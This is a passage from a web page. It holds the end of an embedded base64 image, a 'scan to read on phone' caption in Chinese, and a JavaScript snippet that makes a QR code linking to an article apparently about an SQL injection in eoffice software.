F4h3tYPwe1vWfsp1Xp1vspV9HxpFeq1rpC/ilVToR/ytJVWoV7rVeiB1HZu3ZluXoSxX+8j72j9SjdfeL1C6hZ+UGxfQyDTh9fQz8Gpyzv2PIz9zcOo28e8vCM86nqu1664OqSX3H7yjuY7Qvqc6RAfPPB6hfRbezPfBtKnv+Kr80KmbB7CIagu2l++Qkg9BLvPPoU9B6mpXMUqD6MPRm4dRIcRzYu1V4VcLK2i89KMbSCaLnzvDRwGAuP0IXx1TBjzMPJe55MA8UFQXb+8o3lIHRxRj7UQj3rHlQ9SB8Fe1znEByOe+fb5w0D2yWv9/Tfw1wfi09bRTw3y9JhXF1c6pE6fqL+wazCvgbne6+Uda69ZrHxd77WQ8wDXdwxvP+zjr79CINM++zzhuQ+e5+0P8QFK9399hsf/kPKJ3AwnC+Deo9fJIXkI2s68HJJXh/Celxf+9YFU0yu+fgOHgTjNjqst9JmXQ54GCJoX9Ykw98Go61/1qbw5GGth5OWtgOi13od91CC+rsthzKuv0L77/GEg++S1/v4b2AYCmS48x7MjQuqdvmidHOKDoHr3yVcIqQdWlvvXAzh+TQHuOfeGcJhj3wDiU7ePqA6jD8IhqK9wG0iRK95/A9dA3j+D4QT/AwAA///9jACHAAAABklEQVQDAIyEIuYZCtDcAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-new\_mytable-block\_content-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 